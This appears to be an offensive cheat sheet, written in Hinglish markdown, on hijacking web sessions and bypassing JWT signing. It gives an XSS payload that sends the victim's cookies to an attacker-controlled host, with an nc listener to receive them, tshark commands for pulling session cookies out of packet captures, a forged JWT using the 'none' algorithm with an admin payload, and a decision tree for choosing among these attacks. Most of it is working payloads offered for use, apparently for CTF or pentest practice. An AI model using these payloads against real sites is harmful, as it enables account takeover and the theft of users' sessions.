# 🍪 SESSION HIJACKING / JWT BYPASS

---

## CASE 1: Cookie Steal via XSS
```html
<script>document.location='http://YOUR_IP:8888/?c='+document.cookie</script>
```
```bash
# Listener:
nc -lvnp 8888
# Cookie milega → Browser DevTools → Cookie set karo → Refresh
```

---

## CASE 2: PCAP Se Session Cookie Nikalo
```bash
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie | head -10
# Wireshark: Filter → http.cookie → cookie value copy
# Browser mein set karo → session hijack
```

---

## CASE 3: JWT None Algorithm Bypass
```bash
# JWT decode karo:
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
# {"alg":"HS256"}

# None algorithm forge:
echo -n '{"alg":"none"}' | base64 | tr -d '=' | tr '/+' '_-'
# New JWT: eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
# (empty signature)
```

---

## CASE 4: Predict / Brute Force Session ID
```bash
# Burp Sequencer use karo for analysis
# Ya manual: rapidly login/logout, observe session ID pattern
```

---

## QUICK DECISION:
```
Session hijacking
  ├─ XSS available? → cookie steal via document.cookie
  ├─ PCAP mein? → filter http.cookie → extract
  ├─ JWT token? → check for none algorithm bypass
  └─ Session prediction → Burp Sequencer
```
